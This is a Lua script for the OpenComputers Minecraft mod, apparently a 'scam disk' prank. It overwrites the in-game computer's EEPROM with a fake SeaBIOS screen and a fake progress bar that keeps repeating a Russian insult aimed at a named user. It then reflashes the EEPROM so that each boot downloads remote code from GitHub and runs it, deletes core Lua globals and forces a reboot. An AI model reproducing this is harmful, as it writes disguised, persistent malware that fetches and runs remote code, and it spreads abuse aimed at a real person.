local computer, component = require("computer"), require("component")
local eeprom = component.eeprom

local code = [[--local computer, component = require("computer"), require("component")
local cp, cl = component.proxy, component.list
local gpu = cp(cl("gpu")())
local eeprom = cp(cl("eeprom")())

gpu.bind(cl("screen")(), true)

local resX, resY = 80, 25
gpu.setResolution(resX, resY)

local back = 0x0000FF
local cyan = 0x77b8b7
local gray = 0x91908e
local yellow = 0xffea00

local function sleep(timeout)
    local deadline = computer.uptime() + (timeout or 0)
    repeat
        computer.pullSignal(deadline - computer.uptime() )
    until computer.uptime() >= deadline
end

gpu.setBackground(0x000000)
gpu.setForeground(0xFFFFFF)
gpu.fill(1, 1, resX, resY, " ")
gpu.set(1, 1, "SeaBIOS (v_")

sleep(10)

gpu.setBackground(back)
gpu.setForeground(cyan)

gpu.fill(1, 1, resX, resY, " ")

gpu.set(5, 2, "@danilacasito pidor")
gpu.fill(5, 3, resX - 6 - 2, 1, "—")
gpu.set(5, 5, "@danilacasito pidor")
gpu.set(5, 6, "@danilacasito pidor")
gpu.fill(5, resY - 2, resX - 6 - 2, 1, "—")

gpu.setForeground(gray)
gpu.set(5, 8, "@danilacasito pidor")
gpu.set(5, 9, "@danilacasito pidor")
gpu.set(5, 11, "@danilacasito pidor")

gpu.setForeground(yellow)
gpu.fill(19, resY - 1, resX - 2 - 19, 1, "▒")

local function draw(percent)
    local count = math.floor( (resX - 2 - 19) * (percent / 100) ) -- from 0 to (resX - 2 - 19)

    gpu.setForeground(yellow)
    gpu.fill(19, resY - 1, count, 1, "█")
    

    gpu.setForeground(cyan)
    if (percent < 10) then
        gpu.set(6, resY - 1, tostring(percent) .. "% complete")
    else
        gpu.set(5, resY - 1, tostring(percent) .. "% complete")
    end
end

local i = 0
for i=0, 100 do
    draw(i)
    sleep( math.random(0.025, 0.25) )
end

eeprom.set("local a,b,c=component.proxy(component.list(\"internet\")()).request(\"https://raw.githubusercontent.com/KKosty4ka/OpenComputers-ScamDisk/master/efi2.lua\"),\"\"while true do c=a.read(math.huge)if c then b=b..c else break end end;a.close()load(b)()")

error("@danilacasito pidor", 0)]]

eeprom.set(code)

_G.assert = nil
_G.math = nil
_G.package = nil
_G.checkArg = nil
_G.debug = nil

os.sleep(3)

computer.shutdown(true)
